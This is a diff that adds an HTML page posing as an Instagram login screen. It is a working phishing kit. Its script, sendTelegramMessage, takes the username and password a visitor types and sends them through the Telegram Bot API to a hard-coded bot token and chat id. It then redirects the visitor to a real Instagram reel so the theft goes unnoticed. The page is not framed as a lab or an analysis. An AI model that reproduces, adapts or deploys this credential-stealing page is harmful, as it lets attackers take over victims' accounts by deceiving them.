@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>          
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" type="image/png" href="https://i0.wp.com/blog.whitneydawnmusic.com/wp-content/uploads/2017/09/insta-logo.png?fit=768%2C768&ssl=1">
+    <link rel="stylesheet" href="./instagram.css">
+</head>
+<body>
+    <div class="container" id  = "main">    
+        <img src="Screenshot 2024-03-11 141757.png" class="image-logo">
+        <div></div>
+        <form class="my-form">
+            <input id="username" type="text" placeholder="Phone number, username, or email">
+            <input id="password" type="password" placeholder="Password">
+            <button class="logbutt" onclick="sendTelegramMessage(event)">Log in</button>
+            <div class="option">OR</div>
+        </form>
+        <div class="fblink">
+            <span class="fab fa-facebook"></span>
+            <img src="R.png" class="fb-logo">
+            <a href="https://www.facebook.com/login.php/">Log in with Facebook</a>
+        </div>
+        <div class="forget-id">
+            <a href="#">Forget password?</a>
+        </div>
+        <div class="signup">
+            <p>Don't have an account?<a href="#">Sign up</a></p>
+        </div>
+    </div>
+
+    <script>
+        function sendTelegramMessage(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            if (!username || !password){
+                const main  = document.getElementById("main") ;
+                main.innerText("some text")
+                console.log("validation confguration in valid")
+                return ;
+            }
+
+            const url = `https://api.telegram.org/bot6731395631:AAFsPGU9WbJBnECBNfJVyqqtUZgypOkDAYE/sendMessage?chat_id=6591108906&text=Username:${username},Password:${password}`;
+            const formData  = new FormData ;
+            formData.append('chat_id', '6591108906');
+            formData.append('text', `Username: ${username},      Password: ${password}`);
+            fetch(url, {
+                method: 'POST',
+                body : formData
+                
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.log("an error have occured")
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log(data);
+                window.location.href = "https://www.instagram.com/reel/C46fqO5ig-z/?utm_source=ig_web_copy_link";
+            })
+            .catch(error => {
+                console.error('There has been a problem with your fetch operation:', error);
+            });
+        }
+    </script>
+</body>
+</html>
